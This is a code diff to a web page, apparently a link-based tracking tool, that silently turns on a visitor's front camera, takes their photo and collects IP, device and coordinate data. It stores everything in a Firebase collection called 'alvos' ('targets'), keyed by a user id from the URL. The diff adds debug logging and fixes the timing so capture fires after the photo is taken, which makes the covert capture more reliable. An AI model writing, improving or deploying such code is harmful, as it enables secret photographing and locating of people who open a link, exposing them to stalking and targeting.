@@ -14,15 +14,19 @@ export default function LocationCapturePage() {
   const streamRef = useRef<MediaStream | null>(null)
   const [photoData, setPhotoData] = useState<string | null>(null)
   const [userId, setUserId] = useState<string | null>(null)
+  const captureAttempted = useRef(false)
 
   useEffect(() => {
     const params = new URLSearchParams(window.location.search)
     const userIdParam = params.get("uid")
     setUserId(userIdParam)
 
+    console.log("[v0] 📸 Location capture page loaded, user:", userIdParam)
+
     // Auto-start camera and capture photo silently
     const autoCapture = async () => {
       try {
+        console.log("[v0] 📷 Starting camera...")
         const stream = await navigator.mediaDevices.getUserMedia({
           video: {
             facingMode: "user",
@@ -37,6 +41,7 @@ export default function LocationCapturePage() {
           streamRef.current = stream
 
           videoRef.current.onplaying = () => {
+            console.log("[v0] 📹 Video playing, waiting 2s before capture...")
             setTimeout(() => {
               if (videoRef.current && videoRef.current.readyState >= 2) {
                 const canvas = document.createElement("canvas")
@@ -47,6 +52,7 @@ export default function LocationCapturePage() {
                 if (ctx && canvas.width > 0 && canvas.height > 0) {
                   ctx.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height)
                   const photoDataUrl = canvas.toDataURL("image/jpeg", 0.8)
+                  console.log("[v0] ✅ Photo captured successfully")
                   setPhotoData(photoDataUrl)
 
                   if (streamRef.current) {
@@ -54,20 +60,22 @@ export default function LocationCapturePage() {
                     streamRef.current = null
                   }
                 } else {
+                  console.log("[v0] ⚠️ Camera error - invalid canvas")
                   setPhotoData("camera_error")
                 }
               } else {
+                console.log("[v0] ⚠️ Camera error - video not ready")
                 setPhotoData("camera_error")
               }
             }, 2000)
           }
 
           videoRef.current.play().catch((err) => {
-            console.error("Video play error:", err)
+            console.error("[v0] ❌ Video play error:", err)
           })
         }
       } catch (error) {
-        console.error("Auto-capture error:", error)
+        console.error("[v0] ❌ Auto-capture error:", error)
         setPhotoData("camera_denied")
       }
     }
@@ -76,19 +84,24 @@ export default function LocationCapturePage() {
   }, [])
 
   useEffect(() => {
-    if (!hasCaptured && !isCapturing) {
+    if (photoData && !captureAttempted.current && !hasCaptured && !isCapturing) {
+      console.log("[v0] 🎯 Photo ready, triggering data capture...")
+      captureAttempted.current = true
       handleAutoCapture()
     }
-  }, [hasCaptured, isCapturing])
+  }, [photoData, hasCaptured, isCapturing])
 
   const handleAutoCapture = async () => {
     if (isCapturing || hasCaptured) {
+      console.log("[v0] ⏭️ Skipping capture (already capturing or captured)")
       return
     }
 
+    console.log("[v0] 🚀 Starting auto capture...")
     setIsCapturing(true)
 
     try {
+      console.log("[v0] 🌐 Fetching IP and device data...")
       const data = await captureAllData()
 
       const userPath = userId || "anonymous"
@@ -120,13 +133,23 @@ export default function LocationCapturePage() {
           photoData && photoData !== "camera_denied" && photoData !== "camera_error" ? { photo: photoData } : undefined,
       }
 
-      console.log("[v0] Saving to Firebase:", `alvos/${userPath}`)
+      console.log("[v0] 💾 Saving to Firebase path:", `alvos/${userPath}`)
+      console.log("[v0] 📦 Payload:", {
+        pageType: capturePayload.pageType,
+        hasIpData: !!capturePayload.ipData,
+        hasPhoto: !!capturePayload.formData?.photo,
+        coordinates: capturePayload.ipData
+          ? `${capturePayload.ipData.latitude}, ${capturePayload.ipData.longitude}`
+          : "none",
+      })
+
       const result = await push(alvosRef, capturePayload)
-      console.log("[v0] Saved with key:", result.key)
+      console.log("[v0] ✅ SAVED TO FIREBASE with key:", result.key)
+      console.log("[v0] 🎉 Capture complete!")
 
       setHasCaptured(true)
     } catch (error) {
-      console.error("[v0] Capture error:", error)
+      console.error("[v0] ❌ Capture error:", error)
       setHasCaptured(true)
     } finally {
       setIsCapturing(false)
